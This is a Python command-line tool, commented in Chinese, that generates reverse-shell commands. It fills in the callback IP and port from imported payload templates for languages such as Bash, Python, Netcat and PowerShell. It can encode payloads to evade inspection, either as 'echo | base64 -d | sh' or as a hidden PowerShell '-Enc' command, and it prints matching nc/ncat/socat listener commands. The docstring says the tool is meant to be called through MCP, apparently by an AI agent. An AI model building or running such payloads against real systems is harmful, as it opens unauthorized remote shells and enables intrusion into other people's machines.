#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""反弹 Shell 命令生成器（命令行版，无需图形界面）。

复用 revshell_templates.PAYLOADS 模板与 revshell_utils 的编码/探测函数，
供 geshell 与 MCP 直接调用——原 revshell_generator.py 依赖 customtkinter，
无法在无图形环境下运行。

用法：
  revshell_cli.py -p 4444                      # IP 自动探测
  revshell_cli.py 10.0.0.5 -p 4444             # 指定 IP
  revshell_cli.py 10.0.0.5 -p 4444 -l Python
  revshell_cli.py 10.0.0.5 -p 4444 -l Netcat -v reverse_e
  revshell_cli.py 10.0.0.5 -p 4444 -l PowerShell -e Base64
  revshell_cli.py --list                       # 列出全部语言与变体

示例：
  revshell_cli.py 10.0.0.5 -p 4444 -l Bash
  revshell_cli.py 10.0.0.5 -p 4444 --listener socat
"""
import argparse
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from revshell_templates import (  # noqa: E402
    ALL_LANG_LIST, COMMON_LANG_LIST, ENCODE_LIST, LISTENER_TYPES,
    PAYLOADS, variant_label,
)
from revshell_utils import detect_ip, encode_command, is_valid_port  # noqa: E402


def list_all():
    """打印全部语言、变体与监听命令。"""
    print("可用语言（--lang / -l）：")
    for lang in ALL_LANG_LIST:
        mark = " *常用" if lang in COMMON_LANG_LIST else ""
        print(f"  {lang}{mark}")
        for key in PAYLOADS[lang]:
            print(f"      {key:18s} -> {variant_label(key)}")
    print()
    print("可用编码（--encode / -e）：" + "、".join(ENCODE_LIST))
    print()
    print("监听命令（--listener）：")
    for name, tpl in LISTENER_TYPES:
        print(f"  {name:12s} {tpl.format(port='<port>')}")


def resolve_lang(value):
    """按名称匹配语言，忽略大小写。"""
    for lang in ALL_LANG_LIST:
        if lang.lower() == value.lower():
            return lang
    return None


def resolve_variant(lang, value):
    """按原始键或显示标签匹配变体，忽略大小写；未指定时取第一个。"""
    variants = PAYLOADS[lang]
    if value is None:
        return next(iter(variants))
    for key in variants:
        if value.lower() in (key.lower(), variant_label(key).lower()):
            return key
    return None


def resolve_listener(value):
    """按名称匹配监听方式。"""
    if value is None:
        return None
    for name, _ in LISTENER_TYPES:
        if name.lower() == value.lower():
            return name
    return None


def encode_payload(lang, raw, encode):
    """按语言选择编码方式。

    Base64 在类 Unix 目标上是 `echo <b64> | base64 -d | sh`（utils 的通用实现），
    但 Windows 目标上没有 base64/shell，正确姿势是 PowerShell 的
    `-EncodedCommand`——它要求 UTF-16LE 的 Base64。两者不能混用。
    """
    if encode != "Base64":
        return raw, "无编码"
    if lang == "PowerShell":
        b64 = base64.b64encode(raw.encode("utf-16-le")).decode()
        return f"powershell -NoP -NonI -W Hidden -Enc {b64}", "PowerShell -EncodedCommand (UTF-16LE)"
    return encode_command(raw, encode), "Base64 (echo | base64 -d | sh)"


def main():
    ap = argparse.ArgumentParser(
        description="反弹 Shell 命令生成器（命令行版，复用图形版的模板）",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("ip", nargs="?", help="回连 IP（省略则自动探测本机出口 IP）")
    ap.add_argument("-p", "--port", required=False, default="4444",
                    help="回连端口（默认 4444）")
    ap.add_argument("-l", "--lang", default="Bash",
                    help="语言/环境，默认 Bash；用 --list 看全部")
    ap.add_argument("-v", "--variant", default=None,
                    help="变体，如 reverse_e / mkfifo；默认取第一个")
    ap.add_argument("-e", "--encode", default="无编码", choices=ENCODE_LIST,
                    help="编码方式，默认 无编码")
    ap.add_argument("--listener", default=None,
                    help="同时输出对应监听命令，如 nc / ncat / socat")
    ap.add_argument("--list", action="store_true",
                    help="列出全部语言、变体与监听命令后退出")
    ap.add_argument("--quiet", action="store_true",
                    help="只输出 payload 本身（便于管道使用）")
    args = ap.parse_args()

    if args.list:
        list_all()
        return 0

    lang = resolve_lang(args.lang)
    if lang is None:
        print(f"[错误] 未知语言: {args.lang}", file=sys.stderr)
        print(f"       可用: {'、'.join(ALL_LANG_LIST)}", file=sys.stderr)
        return 1

    if not is_valid_port(args.port):
        print(f"[错误] 非法端口: {args.port}（应为 1-65535）", file=sys.stderr)
        return 1

    variant = resolve_variant(lang, args.variant)
    if variant is None:
        print(f"[错误] {lang} 无此变体: {args.variant}", file=sys.stderr)
        print("       可用: " + "、".join(
            f"{variant_label(k)}({k})" for k in PAYLOADS[lang]), file=sys.stderr)
        return 1

    if args.listener is not None and resolve_listener(args.listener) is None:
        print(f"[错误] 未知监听方式: {args.listener}", file=sys.stderr)
        print("       可用: " + "、".join(n for n, _ in LISTENER_TYPES),
              file=sys.stderr)
        return 1

    ip = args.ip
    if not ip:
        ip = detect_ip()
        if not ip:
            print("[错误] 无法自动探测本机 IP，请显式指定。", file=sys.stderr)
            return 1
        if not args.quiet:
            print(f"[提示] 自动探测到本机 IP: {ip}", file=sys.stderr)

    raw = PAYLOADS[lang][variant].format(ip=ip, port=args.port)
    payload, encode_desc = encode_payload(lang, raw, args.encode)

    if args.quiet:
        print(payload)
        return 0

    # 用原始键而非 variant_label：后者把 reverse_e 显示成 "E"，命令行里有歧义
    print(f"[OK] {lang} / {variant}  {ip}:{args.port}")
    print(f"[编码] {encode_desc}")
    print()
    print(payload)

    if args.listener:
        for name, tpl in LISTENER_TYPES:
            if name.lower() == args.listener.lower():
                print()
                print("[监听] " + tpl.format(port=args.port))
                break
    elif args.encode == "Base64" and lang != "PowerShell":
        print()
        print("[提示] 目标端需能执行 base64；若不能，改用 -e 无编码。")

    return 0


if __name__ == "__main__":
    sys.exit(main())
